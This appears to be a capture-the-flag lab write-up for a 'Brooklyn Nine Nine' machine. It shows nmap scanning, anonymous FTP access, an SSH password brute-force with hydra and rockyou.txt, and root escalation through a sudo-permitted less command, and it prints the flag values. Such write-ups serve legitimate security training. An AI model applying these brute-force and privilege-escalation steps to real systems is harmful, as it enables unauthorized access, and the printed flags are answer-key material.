## A. Enumeration

### A.1 Nmap

```
┌─[glack@parrot]─[~/Desktop/THM/Lian_Yu]
└──╼ $nmap -sV -sT -A 10.10.162.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-23 05:48 IST
Nmap scan report for 10.10.162.152
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

### FTP


1. Anonymous login allowed
2. file found
```
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt

```

```
┌─[glack@parrot]─[~/Desktop/THM/b99]
└──╼ $cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

### HTTP

```
┌─[glack@parrot]─[~/Desktop/THM/thecodcaper]
└──╼ $feroxbuster -u http://10.10.162.152/ -w /usr/share/wordlists/small.txt -x php,html
```

found nothing in http

## B. Shell

1. got a hint that Jake's password is weak, that means it must be in the rockyou.txt
2. used hydra to bruteforce ssh login with Jake's username

```
┌─[✗]─[glack@parrot]─[~/Desktop/THM/b99]
└──╼ $hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.162.152 ssh
```

found the password
```
22][ssh] host: 10.10.162.152   login: jake   password: 987654321
```


3. found the user flag in holt's home directory

```
jake@brookly_nine_nine:/home/holt$ cat user.txt
ee11cbb19052e40b07aac0ca060c23ee
```

## C. Priv ESC

1. Jake is able to run `less`  command with sudo privileges
```
ser jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

2. used that to get the root flag

```
jake@brookly_nine_nine:/home/holt$ sudo less /root/root.txt
```

```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

```